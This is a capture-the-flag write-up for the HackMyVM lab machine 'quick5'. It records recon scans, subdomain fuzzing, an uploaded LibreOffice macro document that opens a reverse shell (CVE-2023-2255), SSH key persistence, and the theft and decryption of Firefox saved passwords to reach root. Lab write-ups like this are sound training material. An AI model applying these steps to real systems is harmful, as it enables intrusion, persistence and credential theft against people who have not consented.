# quick5

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| quick5 | eMVee | Beginner | HackMyVM |

**Summary:** The exploitation of the Quick5 machine involved a multi:staged approach starting with network enumeration to identify open services: SSH on port 22 and Apache on port 80. Subdomain fuzzing revealed several hidden virtual hosts, most notably a careers site hosting an application form with file upload functionality. By researching the environment and the specific behavior of the upload filter, it was determined that the system was vulnerable to CVE:2023:2255, a flaw related to LibreOffice. A malicious ODT file containing a macro was crafted to execute a reverse shell upon being processed by the server's automated backend. Once initial access was gained as the user andrew, enumeration revealed Firefox profiles containing saved credentials. Using the firepwd tool to decrypt the key4.db and logins.json files, the cleartext password for the user was recovered. This password allowed for a direct transition to the root user through the su command, leading to the full compromise of the system and the retrieval of both user and root flags.

---

## Reconnaissance

The initial phase of the assessment began with a network discovery scan to identify the target IP address within the local subnet.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick5]
└─$ nmap -sn -PR 192.168.100.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-22 14:26 WIB
Nmap scan report for 192.168.100.1 (192.168.100.1)
Host is up (0.0072s latency).
Nmap scan report for 192.168.100.2 (192.168.100.2)
Host is up (0.0054s latency).
Nmap scan report for 192.168.100.204 (192.168.100.204)
Host is up (0.0046s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 4.17 seconds
```

After identifying the target at 192.168.100.204, a comprehensive port scan was conducted to enumerate services and versions.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick5]
└─$ nmap -sCV -p- -T4 192.168.100.204
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-22 14:27 WIB
Nmap scan report for 192.168.100.204 (192.168.100.204)
Host is up (0.0041s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 84:e8:9c:b0:23:44:41:29:ae:7d:0b:0f:fe:88:08:c0 (ECDSA)
|_  256 44:82:b7:78:47:02:7e:b4:40:c7:6b:fd:70:68:c1:42 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Quick Automative - Home
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.49 seconds
```

The web server on port 80 was visited, displaying the primary landing page for Quick Automotive.

![alt text](image.png)

Further inspection of the web application suggested the presence of virtual hosting.

![alt text](image-1.png)

## Subdomain Fuzzing

To discover additional entry points, a subdomain fuzzing attack was performed using ffuf against the quick.hmv domain.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick5]
└─$ ffuf -u "http://quick.hmv/" -H "Host: FUZZ.quick.hmv" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 51519

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://quick.hmv/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.quick.hmv
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 51519
________________________________________________

careers                 [Status: 200, Size: 13819, Words: 3681, Lines: 245, Duration: 121ms]
customer                [Status: 200, Size: 2258, Words: 292, Lines: 41, Duration: 359ms]
www.careers             [Status: 200, Size: 13819, Words: 3681, Lines: 245, Duration: 343ms]
www.customer            [Status: 200, Size: 2258, Words: 292, Lines: 41, Duration: 252ms]
employee                [Status: 200, Size: 2258, Words: 292, Lines: 41, Duration: 230ms]
vodka                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1187ms]
:: Progress: [114442/114442] :: Job [1/1] :: 107 req/sec :: Duration: [0:17:24] :: Errors: 0 ::
```

The identified subdomains were added to the local /etc/hosts file for proper resolution.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick5]
└─$ echo '192.168.100.204  quick.hmv careers.quick.hmv customer.quick.hmv www.careers.quick.hmv www.customer.quick.hmv employee.quick.hmv vodka.quick.hmv' | sudo tee -a /etc/hosts
[sudo] password for ouba:
192.168.100.204  quick.hmv careers.quick.hmv customer.quick.hmv www.careers.quick.hmv www.customer.quick.hmv employee.quick.hmv vodka.quick.hmv
```

## Web Enumeration: Careers

A directory search was conducted on the careers.quick.hmv subdomain to locate interesting files or directories.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick5]
└─$ gobuster dir -u http://careers.quick.hmv/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://careers.quick.hmv/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 13819]
/img                  (Status: 301) [Size: 320] [--> http://careers.quick.hmv/img/]
/upload.php           (Status: 200) [Size: 0]
/css                  (Status: 301) [Size: 320] [--> http://careers.quick.hmv/css/]
/lib                  (Status: 301) [Size: 320] [--> http://careers.quick.hmv/lib/]
/developer.html       (Status: 200) [Size: 14009]
/js                   (Status: 301) [Size: 319] [--> http://careers.quick.hmv/js/]
/apply.php            (Status: 200) [Size: 12967]
/fonts                (Status: 301) [Size: 322] [--> http://careers.quick.hmv/fonts/]
```

The apply.php page featured an application form that allowed users to upload documents.

![alt text](image-2.png)

Attempts to upload standard PHP scripts or images resulted in a notification that the file was received, but no immediate execution occurred.

![alt text](image-3.png)

## Exploitation: CVE:2023:2255

Research into the environment and the nature of the application suggested a vulnerability in how uploaded documents are processed. The system appeared to be vulnerable to CVE:2023:2255, which involves improper handling of links in LibreOffice. A Proof of Concept was located at https://github.com/elweth-sec/CVE-2023-2255.

Initial attempts focused on manually crafting a malicious ODT file by modifying its internal XML structures.

To ensure a successful exploitation, the approach was simplified by using LibreOffice Writer directly to create a macro:enabled document.

![alt text](image-4.png)

A new document was created within the LibreOffice interface.

![alt text](image-6.png)

The macro was written to execute a bash reverse shell command.

![alt text](image-5.png)

The document settings were adjusted to trigger the macro automatically upon opening.

![alt text](image-7.png)

Final verification of the document events was performed before saving.

![alt text](image-8.png)

A listener was started on the local machine to capture the incoming connection.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick5]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

The un.odt file was uploaded to the careers site. After a short delay, a reverse shell was received as the user andrew.

```bash
connect to [172.20.131.21] from (UNKNOWN) [172.20.128.1] 49564
bash: cannot set terminal process group (2523): Inappropriate ioctl for device
bash: no job control in this shell
bash: /home/andrew/.bashrc: Permission denied
andrew@quick5:~/applicants$ id
id
uid=1000(andrew) gid=1000(andrew) groups=1000(andrew),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
andrew@quick5:~/applicants$ which script
which script
/usr/bin/script
andrew@quick5:~/applicants$ script -qc /bin/bash /dev/null
script -qc /bin/bash /dev/null
andrew@quick5:~/applicants$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick5]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

andrew@quick5:~/applicants$ export SHELL=/bin/bash
andrew@quick5:~/applicants$ export TERM=xterm
```

## Internal Enumeration

With a stable shell, the home directory of andrew was explored.

```bash
andrew@quick5:~/applicants$ cd
andrew@quick5:~$ ls -la
total 120
drwxr-x--- 16 andrew andrew  4096 Mar 26  2024 .
drwxr-xr-x  3 root   root    4096 Feb 20  2024 ..
drwxrwxr-x  2 andrew andrew  4096 May 23 03:03 applicants
lrwxrwxrwx  1 andrew andrew     9 Feb 20  2024 .bash_history -> /dev/null
-rw-r--r--  1 andrew andrew   220 Jan  6  2022 .bash_logout
-rw-r--r--  1 andrew andrew  3771 Jan  6  2022 .bashrc
drwx------ 13 andrew andrew  4096 Feb 20  2024 .cache
drwx------ 12 andrew andrew  4096 Feb 20  2024 .config
-rw-rw-r--  1 andrew andrew 10240 Mar  1  2024 customer.tar
drwxr-xr-x  2 andrew andrew  4096 Feb 20  2024 Desktop
drwxr-xr-x  2 andrew andrew  4096 Feb 20  2024 Documents
drwxr-xr-x  2 andrew andrew  4096 Feb 20  2024 Downloads
drwx------  3 andrew andrew  4096 Feb 20  2024 .local
drwxr-xr-x  2 andrew andrew  4096 Feb 20  2024 Music
drwxr-xr-x  2 andrew andrew  4096 Feb 20  2024 Pictures
-rw-r--r--  1 andrew andrew   807 Jan  6  2022 .profile
drwxr-xr-x  2 andrew andrew  4096 Feb 20  2024 Public
-rw-rw-r--  1 andrew andrew    66 Feb 20  2024 .selected_editor
drwx------  3 andrew andrew  4096 Mar 26  2024 snap
drwx------  2 andrew andrew  4096 Feb 20  2024 .ssh
-rw-r--r--  1 andrew andrew     0 Feb 20  2024 .sudo_as_admin_successful
drwxr-xr-x  2 andrew andrew  4096 Feb 20  2024 Templates
-rw-r-----  1 andrew andrew  5751 Feb 20  2024 user.txt
-rw-r-----  1 andrew andrew     5 Mar 26  2024 .vboxclient-clipboard-tty2-control.pid
-rw-r-----  1 andrew andrew     5 Mar 26  2024 .vboxclient-draganddrop-tty2-control.pid
-rw-r-----  1 andrew andrew     5 Mar 26  2024 .vboxclient-hostversion-tty2-control.pid
-rw-r-----  1 andrew andrew     5 Mar 26  2024 .vboxclient-seamless-tty2-control.pid
-rw-r-----  1 andrew andrew     5 Mar 26  2024 .vboxclient-vmsvga-session-tty2-control.pid
drwxr-xr-x  2 andrew andrew  4096 Feb 20  2024 Videos
```

Persistence was established by adding an RSA public key to the authorized_keys file.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick5]
└─$ ssh-keygen -t rsa -b 4096 -f quick5_key
Generating public/private rsa key pair.
Enter passphrase for "quick5_key" (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in quick5_key
Your public key has been saved in quick5_key.pub
The key fingerprint is:
SHA256:Un6nBVyzgcU3TqHlEHH2eirbZjkooLFQzynFKOzbqT4 ouba@CLIENT-DESKTOP
The key's randomart image is:
+---[RSA 4096]----+
|           +Oo=. |
|         ....@+. |
|   .   o. o o+...|
|    o ooo  .  .. |
|   . o.+S.. o . .|
|    o o.=. +   o |
|     + * .. .... |
|    E =   . .+=  |
|   .oo     ..o.. |
+----[SHA256]-----+

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick5]
└─$ cat quick5_key.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDJKWwtMtpOeZzlW0FIV1sYSPvmi586qK/5b7AE7v7pInm679QfqNU4OAcRwPN7zWIgKzCkXxhcnhwvKppztbxnJTU+bAJSUETJFG6ZlQ7mibAILobsQU5WhYq8EJt/nqC5oWuQCGNEBMGh2w7wPB3I/59apfsu8S74x82MBSMW/D6FqkUh8nKJ+fZUnLRGJTzWDCdNd9Ha+DQDRjRHrZ4KVYHMyfF7kgYXJvyjpBv9v/Z0vdSacMtFLJWAYR+tYpPpxg6Kny82Q5yofF5MulOwGCQXY6+0Flez42hj4aMIOjmRANpt0uC6HDMCKQyesXd7AlL7tYSSqVyuXcrCCE3KPKVnDEJ3EOYDyAPrJeotjpfIHqpCuhhksZka1F+sdYFFsf0KCrlfXMCEfBMMIrwfmGzNFtGsfhmGP0Uv9zJtMddBEdHPwTY/1lCfZvD4uKbBlZ+tz70QEMw+4579xDPV7hjGfVK2cCDMp4scSL/p7B8J+CaLGp12etSaG5ISP2lXPwEl7vqNHpHQ91NDCLarHDbuTeVc7jDJh1h7QtB3jb22lWRHFm/x94w/zLvBM/j1NMQoyVk0KPzzqgt2VkGZZqUTNmWMzYSBR6IArzVfQlJQ3A+QYM0BPQLzn34XedjE8GkofiPQk0POQpO+Y5CXQ4Dcq3dx32VNdQ3xJqgMfw== ouba@CLIENT-DESKTOP
```

The public key was written to the target server.

```bash
andrew@quick5:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDJKWwtMtpOeZzlW0FIV1sYSPvmi586qK/5b7AE7v7pInm679QfqNU4OAcRwPN7zWIgKzCkXxhcnhwvKppztbxnJTU+bAJSUETJFG6ZlQ7mibAILobsQU5WhYq8EJt/nqC5oWuQCGNEBMGh2w7wPB3I/59apfsu8S74x82MBSMW/D6FqkUh8nKJ+fZUnLRGJTzWDCdNd9Ha+DQDRjRHrZ4KVYHMyfF7kgYXJvyjpBv9v/Z0vdSacMtFLJWAYR+tYpPpxg6Kny82Q5yofF5MulOwGCQXY6+0Flez42hj4aMIOjmRANpt0uC6HDMCKQyesXd7AlL7tYSSqVyuXcrCCE3KPKVnDEJ3EOYDyAPrJeotjpfIHqpCuhhksZka1F+sdYFFsf0KCrlfXMCEfBMMIrwfmGzNFtGsfhmGP0Uv9zJtMddBEdHPwTY/1lCfZvD4uKbBlZ+tz70QEMw+4579xDPV7hjGfVK2cCDMp4scSL/p7B8J+CaLGp12etSaG5ISP2lXPwEl7vqNHpHQ91NDCLarHDbuTeVc7jDJh1h7QtB3jb22lWRHFm/x94w/zLvBM/j1NMQoyVk0KPzzqgt2VkGZZqUTNmWMzYSBR6IArzVfQlJQ3A+QYM0BPQLzn34XedjE8GkofiPQk0POQpO+Y5CXQ4Dcq3dx32VNdQ3xJqgMfw== ouba@CLIENT-DESKTOP" > ./authorized_keys
```

SSH access was confirmed.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick5]
└─$ ssh andrew@192.168.100.204 -i quick5_key
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Sat May 23 03:08:04 AM UTC 2026

  System load:  0.5478515625       Processes:               200
  Usage of /:   69.1% of 13.67GB   Users logged in:         0
  Memory usage: 33%                IPv4 address for enp0s3: 192.168.100.204
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

34 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


Last login: Tue Feb 20 11:58:25 2024
andrew@quick5:~$ id
uid=1000(andrew) gid=1000(andrew) groups=1000(andrew),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
```

Linpeas was transferred to the target to automate further enumeration.

```bash
andrew@quick5:/tmp$ wget http://192.168.100.1:8080/linpeas.sh
--2026-05-23 03:11:50--  http://192.168.100.1:8080/linpeas.sh
Connecting to 192.168.100.1:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 971926 (949K) [application/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                   100%[===========================================>] 949.15K  --.-KB/s    in 0.06s

2026-05-23 03:11:50 (15.1 MB/s) - ‘linpeas.sh’ saved [971926/971926]

andrew@quick5:/tmp$ chmod +x linpeas.sh
```

The scan revealed a cron job that executes LibreOffice on uploaded files, confirming the initial exploit vector.

```bash
╔══════════╣ Check for vulnerable cron jobs
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs
══╣ Cron jobs list
/usr/bin/crontab
# ...
# m h  dom mon dow   command
* * * * * cd /home/mandrew/applicants && file=$(ls -t | head -n 1) && soffice --nolockcheck --norestore -o "$file"
incrontab Not Found
-rw-r--r-- 1 root root    1136 Mar 23  2022 /etc/crontab
```

Additionally, Firefox profiles were found within the andrew user's snap directory.

```bash
andrew@quick5:~/snap/firefox/common/.mozilla/firefox/ii990jpt.default$ ls -l logins.json key4.db
-rw------- 1 andrew andrew 294912 Feb 20  2024 key4.db
-rw-rw-r-- 1 andrew andrew    763 Feb 20  2024 logins.json
```

## Privilege Escalation

The Firefox database files were exfiltrated for offline decryption.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick5]
└─$ wget http://192.168.100.204:8080/logins.json
--2026-05-23 10:53:27--  http://192.168.100.204:8080/logins.json
Connecting to 192.168.100.204:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 763 [application/json]
Saving to: ‘logins.json’

logins.json     100%[=======>]     763  --.-KB/s    in 0s

2026-05-23 10:53:27 (15.5 MB/s) - ‘logins.json’ saved [763/763]


┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick5]
└─$ wget http://192.168.100.204:8080/key4.db
--2026-05-23 10:53:37--  http://192.168.100.204:8080/key4.db
Connecting to 192.168.100.204:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 294912 (288K) [application/octet-stream]
Saving to: ‘key4.db’

key4.db         100%[=======>] 288.00K  --.-KB/s    in 0.03s

2026-05-23 10:53:37 (9.99 MB/s) - ‘key4.db’ saved [294912/294912]
```

The firepwd tool was used to decrypt the saved credentials.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick5]
└─$ git clone https://github.com/lclevy/firepwd
Cloning into 'firepwd'...
...
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/quick5/firepwd]
└─$ python3 firepwd.py -d .
globalSalt: b'7ba7cf7e7ecd9bbbf7cd96a1593a70a2219872c9'
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'ab43e12ebb10e6138598c0bee9956216a2cacc7c63ea29497b0fd40c1f7c81ae'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'd3183d774a528adde004c4256f66'
       }
     }
   }
   OCTETSTRING b'33310e654633037e877384046590c113'
 }
clearText b'70617373776f72642d636865636b0202'
password check? True
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'849979f68b58a9689df9197f126b0f4cbc4cdba5bf59ab93c783e9a85a68a403'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'b9b9a1345f1964e7061f34f7d94b'
       }
     }
   }
   OCTETSTRING b'4edb09e1546acb15e343b88a1a01a9a516a529f2fef28971130dffd3f8fc6872'
 }
clearText b'c826c785d964e9a47023ae837c8002ba9d7c2aeaba4ca1fb0808080808080808'
decrypting login/password pairs
Using 3DES (32-byte key, truncated to 24)
http://employee.quick.hmv:b'andrew.speed@quick.hmv',b'SuperSecretPassword'
```

The decrypted password SuperSecretPassword was used to elevate privileges to root.

```bash
andrew@quick5:~$ su - root
Password:
root@quick5:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
quick5
root@quick5:~# grep -rns "HMV{" /home /root
/home/andrew/user.txt:40:       HMV{f1a[REDACTED]}
/root/root.txt:42:              HMV{7b2[REDACTED]}
```

---

## Attack Chain Summary
1. **Reconnaissance**: Initial Nmap scans identified SSH and Apache services, while subdomain fuzzing revealed the careers.quick.hmv host.
2. **Vulnerability Discovery**: Enumeration of the careers site located an application form with a document upload feature processed by a backend LibreOffice instance.
3. **Exploitation**: A malicious ODT file with an embedded macro was uploaded to trigger a reverse shell upon processing, exploiting CVE:2023:2255.
4. **Internal Enumeration**: Post:exploitation activities included establishing SSH persistence and locating Firefox profile databases containing saved credentials.
5. **Privilege Escalation**: Decryption of the Firefox credentials provided the cleartext password for andrew, which was shared with the root account.
